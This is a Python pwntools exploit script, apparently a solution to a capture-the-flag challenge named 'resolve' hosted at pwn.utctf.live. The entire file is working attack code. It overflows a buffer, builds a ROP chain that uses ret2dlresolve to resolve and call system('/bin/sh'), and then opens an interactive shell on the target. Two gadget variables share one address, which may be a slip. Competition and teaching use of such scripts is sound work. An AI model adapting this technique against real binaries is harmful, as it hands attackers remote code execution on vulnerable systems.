#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.utctf.live', 5435
binary = './resolve'
brkpts = '''
'''

elf = ELF("resolve")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)

pop_rdi = 0x4011c3
pop_rsir15 = 0x4011c3
ret = 0x4011af

if __name__ == "__main__":
    rop = ROP(elf)
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    rop.ret2dlresolve(dlresolve)
    payload = "a"*0x10 + flat([
        ret,
        pop_rdi,
        dlresolve.data_addr,
        elf.plt['gets']
    ]) + rop.chain() + "\n" + dlresolve.payload
    #gdb.attach(io)
    sl(payload)
    io.interactive()
